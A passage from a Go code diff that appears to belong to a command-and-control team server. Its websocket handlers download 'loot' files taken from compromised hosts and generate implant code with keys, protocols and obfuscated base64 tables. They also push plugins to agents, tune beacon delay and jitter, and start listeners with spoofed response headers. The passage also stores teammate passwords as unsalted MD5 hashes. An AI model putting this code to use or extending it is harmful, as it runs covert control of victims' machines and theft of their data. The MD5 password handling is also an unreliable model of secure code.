+					logStr := fmt.Sprintf(log_word["del_loot"], username, fileName)
+					logger.WriteLog(logStr)
+
+					go PushWS("", "send_delloot", map[string]interface{}{
+						"uid":  uid,
+						"file": fileName,
+					})
+
+				case "download_loot":
+					uid, ok := body["uid"].(string)
+					if !ok || !isSafeLootPathPart(uid) {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "download_loot",
+							"message": "uid required",
+						})
+						continue
+					}
+
+					fileName, ok := body["file"].(string)
+					if !ok || !isSafeLootPathPart(fileName) {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "download_loot",
+							"message": "file required",
+						})
+						continue
+					}
+
+					filePath := filepath.Join("uploads", uid, fileName)
+					info, err := os.Stat(filePath)
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "download_loot",
+							"message": "file not found",
+						})
+						continue
+					}
+
+					offset, sendSize, chunked, err := parseDownloadRange(body, info.Size())
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "download_loot",
+							"message": err.Error(),
+						})
+						continue
+					}
+
+					file, err := os.Open(filePath)
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "download_loot",
+							"message": err.Error(),
+						})
+						return
+					}
+
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":      200,
+						"path":      "download_loot",
+						"type":      "file_start",
+						"filename":  fileName,
+						"size":      info.Size(),
+						"offset":    offset,
+						"chunkSize": sendSize,
+						"chunked":   chunked,
+					}); err != nil {
+						_ = file.Close()
+						return
+					}
+
+					sentSize, err := writeBinaryRange(clientWs, file, offset, sendSize)
+					file.Close()
+					if err != nil {
+						return
+					}
+
+					nextOffset := offset + sentSize
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":       200,
+						"path":       "download_loot",
+						"type":       "file_end",
+						"filename":   fileName,
+						"size":       info.Size(),
+						"offset":     offset,
+						"sentSize":   sentSize,
+						"nextOffset": nextOffset,
+						"eof":        nextOffset >= info.Size(),
+						"chunked":    chunked,
+					}); err != nil {
+						return
+					}
+
+				case "agentcode":
+					uid, _ := body["uid"].(string)
+					username_, _ := body["username"].(string)
+					hostname, _ := body["hostname"].(string)
+					keyPart, _ := body["keyPart"].(string)
+					filekey, _ := body["filekey"].(string)
+					ptc, _ := body["protocol"].(string)
+					_os, _ := body["os"].(string)
+					server, _ := body["server"].(string)
+					Path, _ := body["Path"].(string)
+					ConnPath, _ := body["ConnPath"].(string)
+					MsgPath, _ := body["MsgPath"].(string)
+					switch_key, _ := body["switch_key"].(string)
+					download, _ := body["download"].(string)
+					result, _ := body["result"].(string)
+					_net, _ := body["net"].(string)
+					info, _ := body["info"].(string)
+					upload, _ := body["upload"].(string)
+					list, _ := body["list"].(string)
+					option, _ := body["option"].(string)
+					code_, _ := body["code"].(string)
+					windows_pro, _ := body["group_pro"].(string)
+					taskid, _ := body["taskid"].(string)
+
+					host, port, err := net.SplitHostPort(server)
+					if err != nil || host == "" || port == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "agentcode",
+							"message": "invalid server",
+							"taskid":  taskid,
+						})
+						continue
+					}
+
+					server = net.JoinHostPort(host, port)
+
+					serverRouteMu.RLock()
+					base_rounds, exist := base_map[port]
+					serverRouteMu.RUnlock()
+					if !exist {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "agentcode",
+							"message": "base not found",
+							"taskid":  taskid,
+						})
+						continue
+					}
+					code := client_.Generate_agent(ptc, _os, server, Path, ConnPath, MsgPath, switch_key,
+						download, result, _net, info, upload, list, option, username_, uid,
+						hostname, keyPart, filekey, code_, base_rounds, windows_pro)
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":   200,
+						"path":   "agentcode",
+						"taskid": taskid,
+						"data":   code,
+					})
+				case "delserver":
+					port, ok := body["port"].(string)
+					taskid, _ := body["taskid"].(string)
+					if !ok || port == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delserver",
+							"port":    port,
+							"taskid":  taskid,
+							"message": "invalid port",
+						})
+						continue
+					}
+
+					var (
+						serverRemark string
+						found        bool
+					)
+
+					serverDataMu.RLock()
+					for i := range server_data.Servers {
+						server := &server_data.Servers[i]
+						if server.Port == port {
+							serverRemark = server.Remark
+							found = true
+							break
+						}
+					}
+					serverDataMu.RUnlock()
+
+					if !found {
+						stopStr := fmt.Sprintf(
+							log_word["no_found_server"],
+							port,
+						)
+						logger.WriteLog(stopStr)
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "delserver",
+							"port":    port,
+							"taskid":  taskid,
+							"message": stopStr,
+						})
+						continue
+					}
+
+					blocked := false
+					clientDataMu.RLock()
+					for i := range client_data.Clients {
+						client := &client_data.Clients[i]
+						if client.Server == serverRemark {
+							blocked = true
+							break
+						}
+					}
+					clientDataMu.RUnlock()
+					if blocked {
+						stopStr := log_word["stop_server"]
+						logger.WriteLog(stopStr)
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delserver",
+							"port":    port,
+							"taskid":  taskid,
+							"message": stopStr,
+						})
+						continue
+					}
+
+					blocked = false
+					windows_clientMu.RLock()
+					for i := range windows_client_data.Clients {
+						client := &windows_client_data.Clients[i]
+						if client.Server == serverRemark {
+							blocked = true
+							break
+						}
+					}
+					windows_clientMu.RUnlock()
+					if blocked {
+						stopStr := log_word["stop_server"]
+						logger.WriteLog(stopStr)
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delserver",
+							"port":    port,
+							"taskid":  taskid,
+							"message": stopStr,
+						})
+						continue
+					}
+
+					protocol.StopServer(port)
+					stopStr := fmt.Sprintf(
+						log_word["removed_server"],
+						port,
+					)
+					logger.WriteLog(stopStr)
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "delserver",
+						"port":    port,
+						"taskid":  taskid,
+						"message": stopStr,
+					})
+					go PushWS(
+						"",
+						"send_delServer",
+						map[string]interface{}{
+							"port":   port,
+							"taskid": taskid,
+						},
+					)
+				case "changeMsh":
+					uid, ok := body["uid"].(string)
+					taskid, _ := body["taskid"].(string)
+					if !ok {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "changeMsh",
+							"uid":     uid,
+							"taskid":  taskid,
+							"message": "invalid uid",
+						})
+						continue
+					}
+					s_id, ok := body["s_id"].(string)
+					if !ok {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "changeMsh",
+							"uid":     uid,
+							"taskid":  taskid,
+							"message": "invalid s_id",
+						})
+						continue
+					}
+					pos, ok := body["pos"].(string)
+					if !ok {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "changeMsh",
+							"uid":     uid,
+							"taskid":  taskid,
+							"message": "invalid pos",
+						})
+						continue
+					}
+					success, errStr := ChangeMsh(
+						uid,
+						s_id,
+						pos,
+					)
+					if !success {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "changeMsh",
+							"uid":     uid,
+							"taskid":  taskid,
+							"message": errStr,
+						})
+						continue
+					}
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "changeMsh",
+						"uid":     uid,
+						"taskid":  taskid,
+						"message": "reordered",
+					})
+					go PushAgentData(uid, "GetMsgList")
+				case "delMsgGet":
+
+					uid, _ := body["uid"].(string)
+					indexStr, _ := body["index"].(string)
+					taskid, _ := body["taskid"].(string)
+
+					index, err := strconv.Atoi(indexStr)
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delMsgGet",
+							"uid":     uid,
+							"taskid":  taskid,
+							"index":   indexStr,
+							"message": "invalid index",
+						})
+						continue
+					}
+					queuesMu.RLock()
+					q := msgQueues[uid]
+					queuesMu.RUnlock()
+					if q == nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "delMsgGet",
+							"uid":     uid,
+							"taskid":  taskid,
+							"index":   indexStr,
+							"message": "uid queue not found",
+						})
+						continue
+					}
+					q.mu.Lock()
+					if index < 0 || index >= len(q.messages) {
+						q.mu.Unlock()
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delMsgGet",
+							"uid":     uid,
+							"taskid":  taskid,
+							"index":   indexStr,
+							"message": "index out of range",
+						})
+						continue
+					}
+					q.messages = append(
+						q.messages[:index],
+						q.messages[index+1:]...,
+					)
+					q.mu.Unlock()
+
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "delMsgGet",
+						"uid":     uid,
+						"taskid":  taskid,
+						"index":   indexStr,
+						"message": "message deleted",
+					})
+
+					// 向其它连接推送删除消息
+					go PushWS(
+						"",
+						"send_delMsgGet",
+						map[string]interface{}{
+							"uid":    uid,
+							"taskid": taskid,
+							"index":  indexStr,
+						},
+					)
+
+				case "getMsg":
+					uid, _ := body["uid"].(string)
+					msgList := GetMsgList(uid)
+					if len(msgList) == 0 {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "getMsg",
+							"uid":     uid,
+							"message": "no messages found",
+						})
+						continue
+					}
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "getMsg",
+						"message": "success",
+						"uid":     uid,
+						"data":    msgList,
+					})
+				case "getMsgMap":
+					uid, ok := body["uid"].(string)
+					if !ok || uid == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "getMsgMap",
+							"uid":     uid,
+							"message": "invalid uid",
+						})
+						continue
+					}
+					msgMap := sendMsg(uid)
+					if len(msgMap) == 0 {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "getMsgMap",
+							"uid":     uid,
+							"message": "no messages found",
+						})
+						continue
+					}
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "getMsgMap",
+						"message": "success",
+						"uid":     uid,
+						"data":    msgMap,
+					})
+				case "delMsgMap":
+					uid, _ := body["uid"].(string)
+					indexStr, _ := body["index"].(string)
+					taskid, _ := body["taskid"].(string)
+
+					index, err := strconv.Atoi(indexStr)
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delMsgMap",
+							"uid":     uid,
+							"index":   indexStr,
+							"taskid":  taskid,
+							"message": "invalid index",
+						})
+						continue
+					}
+					mapMu.Lock()
+					var uidIndices []int
+					for i := range msg_map_list {
+						msg := &msg_map_list[i]
+						if msg.Uid == uid {
+							uidIndices = append(
+								uidIndices,
+								i,
+							)
+						}
+					}
+					if index < 0 || index >= len(uidIndices) {
+						mapMu.Unlock()
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delMsgMap",
+							"uid":     uid,
+							"index":   indexStr,
+							"taskid":  taskid,
+							"message": "index out of range",
+						})
+						continue
+					}
+					delIdx := uidIndices[index]
+					msg_map_list = append(
+						msg_map_list[:delIdx],
+						msg_map_list[delIdx+1:]...,
+					)
+					mapMu.Unlock()
+
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "delMsgMap",
+						"uid":     uid,
+						"index":   indexStr,
+						"taskid":  taskid,
+						"message": "deleted successfully",
+					})
+
+					// 向其它连接推送删除消息结果
+					go PushWS(
+						"",
+						"send_delMsgMap",
+						map[string]interface{}{
+							"uid":    uid,
+							"taskid": taskid,
+							"index":  indexStr,
+						},
+					)
+
+				case "delPlugin":
+					_os, _ := body["os"].(string)
+					remark, _ := body["remark"].(string)
+					codeWords, _ := body["codeWords"].(string)
+
+					if _os == "" || remark == "" || codeWords == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delPlugin",
+							"remark":  remark,
+							"message": "missing os, remark or codeWords",
+						})
+						continue
+					}
+					serverPluginMu.Lock()
+					originalLen := len(server_plugin.Plugins)
+					newPlugins := make(
+						[]Plugin,
+						0,
+						originalLen,
+					)
+					deleted := false
+					for i := range server_plugin.Plugins {
+						p := &server_plugin.Plugins[i]
+						if p.OS == _os &&
+							p.Remark == remark &&
+							p.CodeWord == codeWords {
+							deleted = true
+							continue
+						}
+						newPlugins = append(
+							newPlugins,
+							*p,
+						)
+					}
+					if deleted {
+						server_plugin.Plugins = newPlugins
+					}
+					serverPluginMu.Unlock()
+					if !deleted {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":   404,
+							"path":   "delPlugin",
+							"remark": remark,
+							"message": fmt.Sprintf(
+								"No plugin found for remark %s, os %s and codeWords %s",
+								remark,
+								_os,
+								codeWords,
+							),
+						})
+						continue
+					}
+
+					go PushWS(
+						"",
+						"send_delPlugin",
+						map[string]interface{}{
+							"os":        _os,
+							"remark":    remark,
+							"codeWords": codeWords,
+						},
+					)
+
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":   200,
+						"path":   "delPlugin",
+						"remark": remark,
+						"message": fmt.Sprintf(
+							"Plugin %s for remark %s and os %s deleted successfully",
+							codeWords,
+							remark,
+							_os,
+						),
+					})
+				case "delFileList":
+					uid, _ := body["uid"].(string)
+					indexStr, _ := body["index"].(string)
+					taskid, _ := body["taskid"].(string)
+					deleted := Del_file_list(uid, indexStr)
+					if deleted {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    200,
+							"path":    "delFileList",
+							"uid":     uid,
+							"index":   indexStr,
+							"taskid":  taskid,
+							"message": "File deleted successfully",
+						})
+						// 向其它连接推送删除目录
+						go PushWS(
+							"",
+							"send_delFileList",
+							map[string]interface{}{
+								"uid":    uid,
+								"taskid": taskid,
+								"index":  indexStr,
+							},
+						)
+					} else {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delFileList",
+							"uid":     uid,
+							"index":   indexStr,
+							"taskid":  taskid,
+							"message": "File not found or invalid index",
+						})
+					}
+
+				case "cleanup":
+					ClearUnmarkedGlobalVars()
+
+				case "change_pro":
+					uid, _ := body["uid"].(string)
+					username_, _ := body["username"].(string)
+					remarks, _ := body["remarks"].(string)
+					delay, _ := body["delay"].(string)
+					jitter, _ := body["jitter"].(string)
+					taskid, _ := body["taskid"].(string)
+					port, _ := body["port"].(string)
+					result := Change_pro(
+						uid,
+						username_,
+						remarks,
+						delay,
+						jitter,
+						taskid,
+						port,
+					)
+					switch result {
+					case "confirm":
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":   200,
+							"path":   "change_pro",
+							"status": "success",
+
+							"message": "changes applied",
+						})
+					case "nil":
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":   404,
+							"path":   "change_pro",
+							"status": "error",
+
+							"message": "client not found",
+						})
+					default:
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":   400,
+							"path":   "change_pro",
+							"status": "error",
+
+							"message": result,
+						})
+					}
+				case "change":
+					uid, _ := body["uid"].(string)
+					username_, _ := body["username"].(string)
+					remarks, _ := body["remarks"].(string)
+					delay, _ := body["delay"].(string)
+					jitter, _ := body["jitter"].(string)
+					taskid, _ := body["taskid"].(string)
+					port, _ := body["port"].(string)
+					result := Change(
+						uid,
+						username_,
+						remarks,
+						delay,
+						jitter,
+						taskid,
+						port,
+					)
+					switch result {
+					case "confirm":
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":   200,
+							"path":   "change",
+							"status": "success",
+
+							"message": "changes applied",
+						})
+					case "nil":
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":   404,
+							"path":   "change",
+							"status": "error",
+
+							"message": "client not found",
+						})
+					default:
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":   400,
+							"path":   "change",
+							"status": "error",
+
+							"message": result,
+						})
+					}
+				case "insertPlugin":
+					remark, _ := body["remark"].(string)
+					code, _ := body["code"].(string)
+					codeWords, _ := body["codeWords"].(string)
+					osName, _ := body["os"].(string)
+					parameter, _ := body["parameter"].(string)
+					parameterDesc, _ := body["parameterDesc"].(string)
+					taskid, _ := body["taskid"].(string)
+				
+					if remark == "" || code == "" || osName == "" || codeWords == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "insertPlugin",
+							"taskid":  taskid,
+							"message": "parameter does not exist",
+						})
+						continue
+					}
+				
+					// 参数切割
+					parameterParts := strings.Split(parameter, ",")
+					if len(parameterParts) == 1 && parameterParts[0] == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "insertPlugin",
+							"taskid":  taskid,
+							"message": "Parameter fields must not be empty",
+						})
+						continue
+					}
+				
+					parameterDescParts := strings.Split(parameterDesc, ",")
+					if len(parameterParts) == 1 && len(parameterDescParts) > 0 {
+						parameterDescParts = []string{parameterDescParts[0]}
+					}
+				
+					// 检查参数名重复
+					paramSet := make(map[string]bool, len(parameterParts))
+					dupParam := ""
+				
+					for _, p := range parameterParts {
+						if p == "" {
+							continue
+						}
+						if paramSet[p] {
+							dupParam = p
+							break
+						}
+						paramSet[p] = true
+					}
+				
+					if dupParam != "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "insertPlugin",
+							"taskid":  taskid,
+							"message": "Parameter fields must not duplicate: " + dupParam,
+						})
+						continue
+					}
+					serverPluginMu.Lock()
+				
+					duplicate := false
+					for i := range server_plugin.Plugins {
+						plugin := &server_plugin.Plugins[i]
+						if plugin.CodeWord == codeWords &&
+							plugin.OS == osName &&
+							plugin.Remark == remark {
+							duplicate = true
+							break
+						}
+					}
+				
+					if duplicate {
+						serverPluginMu.Unlock()
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "insertPlugin",
+							"taskid":  taskid,
+							"message": "CodeWords already exists: " + codeWords,
+						})
+						continue
+					}
+					server_plugin.Plugins = append(
+						server_plugin.Plugins,
+						Plugin{
+							Remark:        remark,
+							Code:           code,
+							CodeWord:       codeWords,
+							OS:             osName,
+							Parameter:     parameterParts,
+							ParameterDesc: parameterDescParts,
+						},
+					)
+					serverPluginMu.Unlock()
+					go PushAgentData(codeWords, "updatePlugin")
+					logger.WriteLog(
+						fmt.Sprintf(
+							log_word["plugin_code"],
+							remark,
+							code,
+						),
+					)
+					_ = clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "insertPlugin",
+						"taskid":  taskid,
+						"message": "Plugin inserted successfully for " + remark,
+					})
+				case "getNetdata":
+					uid, _ := body["uid"].(string)
+					data := getInnet(uid)
+					clientWs.WriteJSON(map[string]interface{}{
+						"code": 200,
+						"path": "getNetdata",
+						"data": data,
+					})
+				case "sendChat":
+					message, _ := body["message"].(string)
+					chatid := chatUID()
+					chat := Chat{
+						Username: username,
+						Message:  message,
+						Time:     time.Now().Format("2006-01-02 15:04:05"),
+						Chatid:   chatid,
+						Type:     "message",
+					}
+					dataChatmu.Lock()
+					data_chat.Chats = append(
+						data_chat.Chats,
+						chat,
+					)
+					dataChatmu.Unlock()
+
+					go PushAgentData(chatid, "updateChat")
+
+					logger.WriteLog(
+						fmt.Sprintf(
+							log_word["chat_message"],
+							username,
+							message,
+						),
+					)
+					clientWs.WriteJSON(map[string]interface{}{
+						"code": 200,
+						"path": "sendChat",
+						"data": chat,
+					})
+				case "deleteChat":
+					chatid, _ := body["chatid"].(string)
+					message, _ := body["message"].(string)
+
+					deletedType := ""
+					deleted := false
+
+					dataChatmu.Lock()
+					for i := len(data_chat.Chats) - 1; i >= 0; i-- {
+						chat := &data_chat.Chats[i]
+						if chat.Chatid == chatid && chat.Username == username {
+							deletedType = chat.Type
+							data_chat.Chats = append(
+								data_chat.Chats[:i],
+								data_chat.Chats[i+1:]...,
+							)
+							deleted = true
+							break
+						}
+					}
+					dataChatmu.Unlock()
+
+					if !deleted {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "deleteChat",
+							"status":  "failed",
+							"chatid":  chatid,
+							"message": "chat not found",
+						})
+						continue
+					}
+
+					if deletedType == "file" && isSafeLootPathPart(message) {
+						filePath := filepath.Join(
+							"chat_uploads",
+							message,
+						)
+						_ = os.Remove(filePath)
+					}
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":   200,
+						"path":   "deleteChat",
+						"status": "deleted",
+						"chatid": chatid,
+					})
+
+					go PushWS(
+						"",
+						"send_deleteChat",
+						map[string]interface{}{
+							"chatid":   chatid,
+							"username": username,
+							"message":  message,
+						},
+					)
+
+				case "changeResponseHead":
+					writeError := func(code int, message string) {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    code,
+							"path":    "changeResponseHead",
+							"message": message,
+						})
+					}
+
+					rawPort, exists := body["port"]
+					if !exists {
+						writeError(400, "port does not exist")
+						continue
+					}
+
+					port, err := normalizePort(rawPort)
+					if err != nil {
+						writeError(400, err.Error())
+						continue
+					}
+
+					rawResponseHead, exists := body["response_head"]
+					if !exists {
+						writeError(400, "response_head does not exist")
+						continue
+					}
+
+					headers, err := normalizeResponseHeaders(rawResponseHead)
+					if err != nil {
+						writeError(400, err.Error())
+						continue
+					}
+
+					responseHead := ""
+
+					if len(headers) > 0 {
+						data, err := json.Marshal(headers)
+						if err != nil {
+							writeError(400, "failed to encode response headers")
+							continue
+						}
+
+						responseHead = string(data)
+					}
+
+					found := false
+
+					serverDataMu.Lock()
+
+					for i := range server_data.Servers {
+						server := &server_data.Servers[i]
+
+						if server.Port == port {
+							server.ResponseHead = responseHead
+							found = true
+							break
+						}
+					}
+
+					serverDataMu.Unlock()
+
+					if !found {
+						writeError(404, "server for this port was not found")
+						continue
+					}
+
+					protocol.UpdateRespHead(port, responseHead)
+
+					message := "Response header updated successfully"
+
+					if responseHead == "" {
+						message = "Response header cleared successfully"
+					}
+
+					_ = clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "changeResponseHead",
+						"message": message,
+						"port":    port,
+					})
+				case "onlineteamment":
+					// 获取所有在线用户
+					wsUsersMu.RLock()
+					users := make([]string, 0, len(wsUsers))
+					for user := range wsUsers {
+						_, username_, _ := strings.Cut(user, "=")
+						if username_ == "" {
+							username_ = "null"
+						}
+						users = append(users, username_)
+					}
+					wsUsersMu.RUnlock()
+					clientWs.WriteJSON(map[string]interface{}{
+						"code": 200,
+						"path": "onlineteamment",
+						"data": users,
+					})
+				case "addteamment":
+					func() {
+						username_, _ := body["username"].(string)
+						password, _ := body["password"].(string)
+
+						if username_ == "" || password == "" {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    400,
+								"path":    "addteamment",
+								"message": "username or password cannot be empty",
+							})
+							return
+						}
+						if strings.ContainsRune(username_, '=') {
+						    clientWs.WriteJSON(map[string]interface{}{
+								"code":    400,
+								"path":    "addteamment",
+								"message": "username contains =",
+							})
+						    return
+						}
+
+						mutex.Lock()
+						defer mutex.Unlock()
+
+						userHash := md5.Sum([]byte(username_))
+						hashedUsername := fmt.Sprintf("%x", userHash)
+
+						passHash := md5.Sum([]byte(password))
+						hashedPassword := fmt.Sprintf("%x", passHash)
+
+						type User struct {
+							Username string `json:"username"`
+							Password string `json:"password"`
+						}
+						type UserFile struct {
+							Users []User `json:"users"`
+						}
+
+						userAdded := false
+
+						userFilePath := "user.json"
+						userData := UserFile{Users: []User{}}
+
+						data, err := os.ReadFile(userFilePath)
+						if err == nil && len(data) > 0 {
+							if err := json.Unmarshal(data, &userData); err != nil {
+								clientWs.WriteJSON(map[string]interface{}{
+									"code":    500,
+									"path":    "addteamment",
+									"message": "invalid user.json format",
+								})
+								return
+							}
+						} else if err != nil && !os.IsNotExist(err) {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    500,
+								"path":    "addteamment",
+								"message": "failed to read user.json",
+							})
+							return
+						}
+
+						for i := range userData.Users {
+							if userData.Users[i].Username == hashedUsername {
+								clientWs.WriteJSON(map[string]interface{}{
+									"code":    400,
+									"path":    "addteamment",
+									"message": "username already exists",
+								})
+								return
+							}
+						}
+
+						userData.Users = append(userData.Users, User{
+							Username: hashedUsername,
+							Password: hashedPassword,
+						})
+
+						output, err := json.MarshalIndent(userData, "", "  ")
+						if err != nil {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    500,
+								"path":    "addteamment",
+								"message": "failed to marshal users",
+							})
+							return
+						}
+
+						if err := os.WriteFile(userFilePath, output, 0600); err != nil {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    500,
+								"path":    "addteamment",
+								"message": "failed to write user.json",
+							})
+							return
+						}
+
+						userAdded = true
+
+						if userAdded {
+							logger.WriteLog(fmt.Sprintf(
+								log_word["add_user"],
+								username_,
+								hashedUsername,
+								hashedPassword,
+							))
+						}
+
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    200,
+							"path":    "addteamment",
+							"message": "user added successfully",
+						})
+					}()
+					// 处理添加白名单逻辑
+				case "getWhitelist":
+					whitelist, err := readWhitelist()
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "getWhitelist",
+							"message": "failed to read white.config",
+						})
+						continue
+					}
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "getWhitelist",
+						"message": "success",
+						"data":    whitelist,
+					})
+				case "saveWhitelist":
+					text, _ := body["text"].(string)
+					lines := strings.Split(strings.ReplaceAll(text, "\r\n", "\n"), "\n")
+					if err := writeWhitelist(lines); err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "saveWhitelist",
+							"message": "failed to write white.config",
+						})
+						continue
+					}
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "saveWhitelist",
+						"message": "whitelist saved successfully",
+					})
+
+				// 处理启动服务器逻辑
+				case "startServer":
+					bodyData, err := json.Marshal(body)
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "startServer",
+							"message": "marshal body failed",
+						})
+						continue
+					}
+
+					var requestData struct {
+						Port         string `json:"port"`
+						Path         string `json:"path"`
+						ConnPath     string `json:"connPath"`
+						MsgPath      string `json:"msgPath"`
+						SwitchKey    string `json:"switch_key"`
+						Download     string `json:"download"`
+						Result       string `json:"result"`
+						Net          string `json:"net"`
+						Info         string `json:"info"`
+						Upload       string `json:"upload"`
+						List         string `json:"list"`
+						Option       string `json:"option"`
+						Uid          string `json:"uid"`
+						Hostname     string `json:"hostname"`
+						KeyPart      string `json:"keyPart"`
+						Filekey      string `json:"filekey"`
+						Protocol     string `json:"protocol"`
+						Remark       string `json:"remark"`
+						CertContent  string `json:"cert"`
+						KeyContent   string `json:"key"`
+						WindowsPro   string `json:"Group_pro"`
+						BaseRounds   string `json:"base_rounds"`
+						ResponseHead string `json:"response_head"`
+					}
+
+					if err := json.Unmarshal(bodyData, &requestData); err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "startServer",
+							"message": "invalid JSON",
+						})
+						continue
+					}
+
+					if requestData.Path == "" || requestData.Port == "" || requestData.Protocol == "" || requestData.Remark == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "startServer",
+							"message": "parameter does not exist",
+						})
+						continue
+					}
+					
+					_,port_err := normalizePort(requestData.Port)
+					if port_err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "startServer",
+							"message": "invalid port: " + port_err.Error(),
+						})
+						continue
+					}
+
+					serverDataMu.RLock()
+					dupServer := false
+					for i := range server_data.Servers {
+						server := &server_data.Servers[i]
+						if requestData.Port == server.Port || requestData.Remark == server.Remark {
+							dupServer = true
+							break
+						}
+					}
+					serverDataMu.RUnlock()
+					if dupServer {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "startServer",
+							"message": "Port occupancy or remark already exists",
+						})
+						continue
+					}
+
+					paths := []string{
+						requestData.ConnPath,
+						requestData.MsgPath,
+						requestData.SwitchKey,
+						requestData.Download,
+						requestData.Result,
+						requestData.Net,
+						requestData.Info,
+						requestData.Upload,
+						requestData.List,
+						requestData.Option,
+						requestData.Uid,
+						requestData.Hostname,
+						requestData.KeyPart,
+						requestData.Filekey,
+					}
+
+					pathSet := make(map[string]bool)
+					badPathMsg := ""
+					for _, p := range paths {
+						if p == "" {
+							badPathMsg = "Path fields must not be empty"
+							break
+						}
+						if pathSet[p] {
+							badPathMsg = "Path fields must not duplicate: " + p
+							break
+						}
+						pathSet[p] = true
+					}
+					if badPathMsg != "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "startServer",
+							"message": badPathMsg,
+						})
+						continue
+					}
+
+					if strings.TrimSpace(requestData.ResponseHead) != "" {
+						headers, err := normalizeResponseHeaders(
+							requestData.ResponseHead,
+						)
+						if err != nil {
+							_ = clientWs.WriteJSON(map[string]interface{}{
+								"code":    400,
+								"path":    "startServer",
+								"message": err.Error(),
+							})
+							continue
+						}
+						if len(headers) == 0 {
+							requestData.ResponseHead = ""
+						} else {
+							data, err := json.Marshal(headers)
+							if err != nil {
+								_ = clientWs.WriteJSON(map[string]interface{}{
+									"code":    400,
+									"path":    "startServer",
+									"message": "failed to encode ResponseHead",
+								})
+								continue
+							}
+
+							requestData.ResponseHead = string(data)
+						}
+					}
+
+					var decodeMap map[byte]int
+					if requestData.BaseRounds != "" {
+						if !isValidBase64Table(requestData.BaseRounds) {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    400,
+								"path":    "startServer",
+								"message": "Base64 table must be a permutation of A-Z, a-z, 0-9, - and _",
+							})
+							continue
+						}
+
+						decodeMap = buildDecodeMap(requestData.BaseRounds)
+					} else {
